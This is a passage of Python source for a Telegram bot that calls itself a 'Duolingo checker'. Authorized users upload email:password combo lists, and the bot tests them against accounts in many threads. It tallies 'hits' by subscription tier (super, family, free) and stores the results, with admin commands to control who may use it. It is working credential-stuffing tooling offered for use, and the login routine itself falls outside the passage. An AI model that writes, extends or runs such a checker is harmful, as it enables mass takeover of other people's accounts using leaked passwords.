                    eta = (total - completed) / spd if spd > 0 else 0

                    prog = f"""🦉 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚
[{bar}] {pct:.1f}%
📊 {completed:,}/{total:,} ∙ ⏱{elapsed:.0f}s ∙ 🚀{int(spd)}/s ∙ ETA:{int(eta)}s

💎{super_count} 👨‍👩‍👧{family_count} ⚠️{free_count} ❌{fail_count}
+{last_batch_super}💎 +{last_batch_family}👨‍👩‍👧 +{last_batch_free}⚠️ +{last_batch_fail}❌

⚡ /stop to cancel"""
                    try:
                        bot.edit_message_text(prog, status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')
                    except:
                        pass
                    last_batch_super = last_batch_family = last_batch_free = last_batch_fail = 0

    except Exception as e:
        logging.error(f"Process error: {e}\n{traceback.format_exc()}")
        bot.send_message(chat_id, f"⚠️ Error: {str(e)[:100]}\nHits saved!")

    elapsed = time.time() - start_time
    total_hits = super_count + family_count
    rate = round(total_hits / total * 100, 2) if total > 0 else 0

    bot.send_message(chat_id, f"""{'━' * 32}
✅ 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘
{'━' * 32}
⏱ {elapsed:.1f}s ∙ 📋 {total:,} ∙ 🎯 {rate}%
💎{super_count} 👨‍👩‍👧{family_count} ⚠️{free_count} ❌{fail_count}
💾 VIEW HITS for results""", parse_mode='Markdown')
    send_main_menu(chat_id)

    with check_lock:
        checking_active = False
        stop_flag = False
        current_executor = None
        current_futures = None

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def start_command(message):
    if not is_authorized(message.from_user.id):
        bot.reply_to(message,
            f"⛔ Unauthorized.\n\nYour ID: `{message.from_user.id}`\nAsk an admin to add you.",
            parse_mode='Markdown')
        return
    send_main_menu(message.chat.id, message.from_user.id)

@bot.message_handler(commands=['stop'])
def stop_command(message):
    global stop_flag, checking_active, current_executor, current_futures
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔ Unauthorized.")
        return
    if checking_active:
        stop_flag = True
        if current_futures:
            for f in current_futures:
                f.cancel()
        bot.reply_to(message, "🛑 Stopping...")
    else:
        bot.reply_to(message, "ℹ️ No active check.")

@bot.message_handler(commands=['admin'])
def admin_command(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, "⛔ Admin only.")
        return
    send_admin_panel(message.chat.id)

@bot.message_handler(commands=['myid'])
def myid_command(message):
    bot.reply_to(message, f"🆔 Your Telegram ID: `{message.from_user.id}`", parse_mode='Markdown')

@bot.message_handler(commands=['adduser'])
def adduser_cmd(message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/adduser <user_id>`", parse_mode='Markdown')
        return
    try:
        uid = int(parts[1])
        allowed_users.add(uid)
        save_users()
        bot.reply_to(message, f"✅ Added `{uid}` ({len(allowed_users)} total)", parse_mode='Markdown')
    except ValueError:
        bot.reply_to(message, "❌ Invalid ID — must be numeric.")

@bot.message_handler(commands=['removeuser'])
def removeuser_cmd(message):
    if not is_admin(message.from_user.id):
        return
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "Usage: `/removeuser <user_id>`", parse_mode='Markdown')
        return
    try:
        uid = int(parts[1])
        if uid in allowed_users:
            allowed_users.discard(uid)
            save_users()
            bot.reply_to(message, f"✅ Removed `{uid}`", parse_mode='Markdown')
        else:
            bot.reply_to(message, "ℹ️ User not in list.")
    except ValueError:
        bot.reply_to(message, "❌ Invalid ID.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    global checking_active
    if not is_authorized(message.from_user.id):
        bot.reply_to(message, "⛔")
        return
    if checking_active:
        bot.reply_to(message, "⚠️ Running! /stop first")
        return

    status_msg = bot.reply_to(message, "📥 Loading...")

    try:
        file_info = bot.get_file(message.document.file_id)
        content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
        combos = []
        for line in content.split('\n'):
            line = line.strip()
            if ':' in line:
                parts = line.split(':', 1)
                e, p = parts[0].strip(), parts[1].strip()
                if e and p:
                    combos.append((e, p))

        if not combos:
            bot.edit_message_text("❌ No valid combos. Format: email:password",
                                 status_msg.chat.id, status_msg.message_id)
            return

        bot.edit_message_text(
            f"✅ {len(combos):,} combos ∙ 🧵{MAX_THREADS} ∙ 🔄{MAX_RETRIES}x\n🚀 Starting...",
            status_msg.chat.id, status_msg.message_id, parse_mode='Markdown')

        thread = threading.Thread(target=process_combos, args=(message.chat.id, combos))
        thread.daemon = True
        thread.start()

    except Exception as e:
        logging.error(f"File error: {e}")
        bot.edit_message_text(f"❌ {str(e)[:100]}", status_msg.chat.id, status_msg.message_id)

# Capture text replies for admin "add user" flow
@bot.message_handler(func=lambda m: m.from_user.id in pending_admin_action,
                     content_types=['text'])
def admin_text_input(message):
    if not is_admin(message.from_user.id):
        pending_admin_action.pop(message.from_user.id, None)
        return
    action = pending_admin_action.pop(message.from_user.id, None)
    if action == "add":
        text = message.text.strip()
        try:
            uid = int(text)
            if uid in ADMIN_IDS:
                bot.reply_to(message, "ℹ️ Already an admin.")
            elif uid in allowed_users:
                bot.reply_to(message, f"ℹ️ `{uid}` is already authorized.", parse_mode='Markdown')
            else:
                allowed_users.add(uid)
                save_users()
                bot.reply_to(message, f"✅ Added `{uid}`\n👥 Total: {len(allowed_users)}",
                            parse_mode='Markdown')
        except ValueError:
            bot.reply_to(message, "❌ Invalid ID. Must be numeric.")
        send_admin_panel(message.chat.id)

# ========== BOT START ==========
def run_bot():
    load_users()
    # Ensure no other polling instance / webhook is active (fixes 409 Conflict)
    while True:
        try:
            try:
                bot.remove_webhook()
            except Exception:
                pass
            time.sleep(1)

            print("═" * 40)
            print("🦉 DUOLINGO CHECKER V7")
            print(f"👑 Admins: {ADMIN_IDS}")
            print(f"👥 Authorized users: {len(allowed_users)}")
            print(f"🧵 {MAX_THREADS} threads ∙ 🔄 {MAX_RETRIES}x ∙ ⏱ {REQUEST_TIMEOUT}s")
            print("═" * 40)
            print("🟢 Bot started!")
            bot.infinity_polling(timeout=60, long_polling_timeout=60,
                                 allowed_updates=None, skip_pending=True,
                                 restart_on_change=False)
        except KeyboardInterrupt:
            print("🛑 Stopped.")
            break
        except Exception as e:
            logging.error(f"Polling error: {e}")
            logging.info("🔄 Reconnecting in 10s...")
            time.sleep(10)

if __name__ == "__main__":
    run_bot()
